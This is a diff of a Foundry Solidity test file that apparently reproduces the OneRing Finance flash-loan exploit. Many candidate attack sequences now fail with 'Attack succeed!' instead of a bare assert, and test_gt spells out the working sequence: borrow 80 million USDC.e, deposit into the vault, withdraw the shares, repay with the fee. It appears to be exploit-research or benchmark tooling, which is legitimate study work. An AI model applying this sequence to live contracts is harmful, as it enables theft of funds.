@@ -308,7 +308,7 @@ contract OneRingTest is Test, BlockLoader {
         swap_pair_attacker_usdce_mim(amt1, amt2);
         swap_pair_attacker_mim_usdce(amt3, amt4);
         payback_usdce_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -324,7 +324,7 @@ contract OneRingTest is Test, BlockLoader {
         deposit_vault_usdce_vault(amt1);
         withdraw_vault_vault_usdce(amt2);
         payback_usdce_owner(amt3);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -342,7 +342,7 @@ contract OneRingTest is Test, BlockLoader {
         swap_pair_attacker_mim_usdce(amt1, amt2);
         swap_pair_attacker_usdce_mim(amt3, amt4);
         payback_mim_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -358,7 +358,7 @@ contract OneRingTest is Test, BlockLoader {
         withdraw_vault_vault_usdce(amt1);
         deposit_vault_usdce_vault(amt2);
         payback_vault_owner(amt3);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -374,7 +374,7 @@ contract OneRingTest is Test, BlockLoader {
         deposit_vault_usdce_vault(amt1);
         withdraw_vault_vault_usdce(amt2);
         payback_usdce_pair(amt3);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -390,7 +390,7 @@ contract OneRingTest is Test, BlockLoader {
         withdraw_vault_vault_usdce(amt1);
         deposit_vault_usdce_vault(amt2);
         payback_vault_pair(amt3);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -414,7 +414,7 @@ contract OneRingTest is Test, BlockLoader {
         swap_pair_attacker_usdce_mim(amt5, amt6);
         swap_pair_attacker_mim_usdce(amt7, amt8);
         payback_usdce_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -436,7 +436,7 @@ contract OneRingTest is Test, BlockLoader {
         deposit_vault_usdce_vault(amt5);
         withdraw_vault_vault_usdce(amt6);
         payback_usdce_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -458,7 +458,7 @@ contract OneRingTest is Test, BlockLoader {
         swap_pair_attacker_usdce_mim(amt3, amt4);
         swap_pair_attacker_mim_usdce(amt5, amt6);
         payback_usdce_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -478,7 +478,7 @@ contract OneRingTest is Test, BlockLoader {
         deposit_vault_usdce_vault(amt3);
         withdraw_vault_vault_usdce(amt4);
         payback_usdce_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -502,7 +502,7 @@ contract OneRingTest is Test, BlockLoader {
         swap_pair_attacker_mim_usdce(amt5, amt6);
         swap_pair_attacker_usdce_mim(amt7, amt8);
         payback_mim_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -524,7 +524,7 @@ contract OneRingTest is Test, BlockLoader {
         withdraw_vault_vault_usdce(amt4);
         swap_pair_attacker_usdce_mim(amt5, amt6);
         payback_mim_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -546,7 +546,7 @@ contract OneRingTest is Test, BlockLoader {
         swap_pair_attacker_mim_usdce(amt4, amt5);
         deposit_vault_usdce_vault(amt6);
         payback_vault_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -566,7 +566,7 @@ contract OneRingTest is Test, BlockLoader {
         withdraw_vault_vault_usdce(amt3);
         deposit_vault_usdce_vault(amt4);
         payback_vault_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -586,7 +586,7 @@ contract OneRingTest is Test, BlockLoader {
         deposit_vault_usdce_vault(amt3);
         withdraw_vault_vault_usdce(amt4);
         payback_usdce_pair(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -606,7 +606,7 @@ contract OneRingTest is Test, BlockLoader {
         withdraw_vault_vault_usdce(amt3);
         deposit_vault_usdce_vault(amt4);
         payback_vault_pair(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -634,7 +634,7 @@ contract OneRingTest is Test, BlockLoader {
         deposit_vault_usdce_vault(amt9);
         withdraw_vault_vault_usdce(amt10);
         payback_usdce_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -662,7 +662,7 @@ contract OneRingTest is Test, BlockLoader {
         swap_pair_attacker_usdce_mim(amt7, amt8);
         swap_pair_attacker_mim_usdce(amt9, amt10);
         payback_usdce_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -688,7 +688,7 @@ contract OneRingTest is Test, BlockLoader {
         deposit_vault_usdce_vault(amt7);
         withdraw_vault_vault_usdce(amt8);
         payback_usdce_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -716,7 +716,7 @@ contract OneRingTest is Test, BlockLoader {
         swap_pair_attacker_usdce_mim(amt7, amt8);
         swap_pair_attacker_mim_usdce(amt9, amt10);
         payback_usdce_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -742,7 +742,7 @@ contract OneRingTest is Test, BlockLoader {
         deposit_vault_usdce_vault(amt7);
         withdraw_vault_vault_usdce(amt8);
         payback_usdce_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -768,7 +768,7 @@ contract OneRingTest is Test, BlockLoader {
         swap_pair_attacker_usdce_mim(amt5, amt6);
         swap_pair_attacker_mim_usdce(amt7, amt8);
         payback_usdce_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -792,7 +792,7 @@ contract OneRingTest is Test, BlockLoader {
         deposit_vault_usdce_vault(amt5);
         withdraw_vault_vault_usdce(amt6);
         payback_usdce_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -820,7 +820,7 @@ contract OneRingTest is Test, BlockLoader {
         withdraw_vault_vault_usdce(amt8);
         swap_pair_attacker_usdce_mim(amt9, amt10);
         payback_mim_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -848,7 +848,7 @@ contract OneRingTest is Test, BlockLoader {
         swap_pair_attacker_mim_usdce(amt7, amt8);
         swap_pair_attacker_usdce_mim(amt9, amt10);
         payback_mim_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -874,7 +874,7 @@ contract OneRingTest is Test, BlockLoader {
         withdraw_vault_vault_usdce(amt6);
         swap_pair_attacker_usdce_mim(amt7, amt8);
         payback_mim_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -902,7 +902,7 @@ contract OneRingTest is Test, BlockLoader {
         swap_pair_attacker_mim_usdce(amt8, amt9);
         deposit_vault_usdce_vault(amt10);
         payback_vault_owner(amt11);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -928,7 +928,7 @@ contract OneRingTest is Test, BlockLoader {
         withdraw_vault_vault_usdce(amt7);
         deposit_vault_usdce_vault(amt8);
         payback_vault_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -954,7 +954,7 @@ contract OneRingTest is Test, BlockLoader {
         swap_pair_attacker_mim_usdce(amt6, amt7);
         deposit_vault_usdce_vault(amt8);
         payback_vault_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -978,7 +978,7 @@ contract OneRingTest is Test, BlockLoader {
         withdraw_vault_vault_usdce(amt5);
         deposit_vault_usdce_vault(amt6);
         payback_vault_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1002,7 +1002,7 @@ contract OneRingTest is Test, BlockLoader {
         deposit_vault_usdce_vault(amt5);
         withdraw_vault_vault_usdce(amt6);
         payback_usdce_pair(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -1026,18 +1026,22 @@ contract OneRingTest is Test, BlockLoader {
         withdraw_vault_vault_usdce(amt5);
         deposit_vault_usdce_vault(amt6);
         payback_vault_pair(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
     function test_gt() public {
         vm.startPrank(attacker);
+        emit log_named_uint("amt0", 80000000e6);
         borrow_usdce_pair(80000000e6);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", 80000000e6);
         deposit_vault_usdce_vault(80000000e6);
         printBalance("After step1 ");
+        emit log_named_uint("amt2", vault.balanceOf(attacker));
         withdraw_vault_vault_usdce(vault.balanceOf(attacker));
         printBalance("After step2 ");
+        emit log_named_uint("amt3", (80000000e6 * 1003) / 1000);
         payback_usdce_pair((80000000e6 * 1003) / 1000);
         printBalance("After step3 ");
         require(attackGoal(), "Attack failed!");
@@ -1056,7 +1060,7 @@ contract OneRingTest is Test, BlockLoader {
         deposit_vault_usdce_vault(amt1);
         withdraw_vault_vault_usdce(amt2);
         payback_usdce_pair(amt3);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
